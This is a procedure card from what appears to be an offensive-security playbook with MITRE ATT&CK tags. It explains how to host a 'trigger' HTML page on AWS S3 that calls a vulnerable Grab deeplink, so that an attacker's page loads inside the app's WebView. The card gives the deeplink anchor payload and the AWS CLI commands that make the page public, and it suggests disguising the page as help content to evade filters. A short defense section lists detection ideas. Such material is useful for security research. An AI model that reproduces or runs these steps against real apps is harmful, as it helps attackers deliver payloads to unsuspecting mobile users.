---
id: proc-grab-host-trigger-page
tags:
  - hosting
  - s3
  - payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:25:22.880Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Host-Malicious-Trigger-Page-on-S3

## Summary

This procedure involves creating and hosting an HTML page on AWS S3 that serves as a trigger for the Grab deeplink, linking to a secondary malicious page for exploitation.

## Description

The trigger page contains an anchor tag invoking the vulnerable deeplink, which loads a payload page in the app's WebView. Hosting on S3 ensures public accessibility and HTTPS support, mimicking legitimate help content to evade basic filters.

## Requirements

1. AWS account with S3 bucket access
2. Basic HTML/JavaScript knowledge
3. Public bucket configuration (no private ACLs)

## Defense

Defensive measures and detection strategies:

- Scan S3 buckets for anomalous HTML uploads
- Implement bucket policies restricting public writes
- Monitor for deeplink invocations from external domains

## Objectives

1. Deploy accessible trigger mechanism
2. Chain to payload delivery
3. Enable social engineering distribution

## Instructions

### Step 1: Create Trigger HTML

**Context**: Build the initial page with deeplink anchor.

Create index.html:

```html
<a href="grab://open?screenType=HELPCENTER&amp;page=https://s3.amazonaws.com/edited/page2.html">Begin attack!</a>
```

> Upload to S3 root. Expected output: Page loads with clickable link.

### Step 2: Upload to S3

**Context**: Make the page publicly available.

Use AWS CLI:

```bash
aws s3 cp index.html s3://your-bucket/
aws s3api put-object-acl --bucket your-bucket --key index.html --acl public-read
```

> Ensures HTTPS access. Expected output: URL like https://your-bucket.s3.amazonaws.com/index.html serves the page.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- s3
- hosting
